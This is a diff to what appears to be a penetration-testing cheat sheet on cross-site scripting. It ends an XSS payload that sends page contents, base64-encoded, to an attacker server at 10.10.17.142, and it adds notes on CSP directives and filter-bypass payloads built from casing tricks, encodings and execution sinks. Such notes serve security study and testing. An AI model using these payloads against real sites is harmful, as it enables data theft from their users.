@@ -115,3 +115,45 @@ xhr.send();
 var exfil = new XMLHttpRequest();
 exfil.open("GET", "https://10.10.17.142:4443/exfils?r=" + btoa(xhr.responseText), false);
 exfil.send();</script>
+
+
+###Common CSP Directives
+
+- `script-src`: allowed origins for scripts
+- `style-src`: allowed origins for stylesheets
+- `img-src`: allowed origins for images
+- `object-src`: allowed origins for objects such as `<object>` or `<embed>`
+- `connect-src`: allowed origins for HTTP requests from scripts. For instance using `XMLHttpRequest`
+- `default-src`: fallback value if a different directive is not explicitly set. For instance, if the `img-src` is not present in the CSP, the browser will use this value instead for images
+- `frame-ancestors`: origins allowed to frame the page, for instance in an `<iframe>`. This can be used to prevent `Clickjacking` attacks
+- `form-action`: origins allowed for form submissions
+
+## XSS Filter Bypasses
+
+#### Weak Blacklists
+
+- Casing: `<ScRiPt>alert(1);</ScRiPt>`
+- Casing: `<object data="JaVaScRiPt:alert(1)">`
+- Casing: `<img src=x OnErRoR=alert(1)>`
+- No Space: `<svg/onload=alert(1)>`
+
+#### JavaScript Encodings
+
+- Unicode: `"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"`
+- Octal: `"\141\154\145\162\164\50\61\51"`
+- Hex: `"\x61\x6c\x65\x72\x74\x28\x31\x29"`
+- Base64: `atob("YWxlcnQoMSk=")`
+
+#### String Creation
+
+- fromCharCode: `String.fromCharCode(97,108,101,114,116,40,49,41)`
+- source: `/alert(1)/.source`
+- URL Encoding: `decodeURI(/alert(%22xss%22)/.source)`
+
+#### Execution Sinks:
+
+- eval: `eval("alert(1)")`
+- setTimeout: `setTimeout("alert(1)")`
+- setInterval: `setInterval("alert(1)")`
+- Function: `Function("alert(1)")()`
+- constructor: `[].constructor.constructor(alert(1))()`
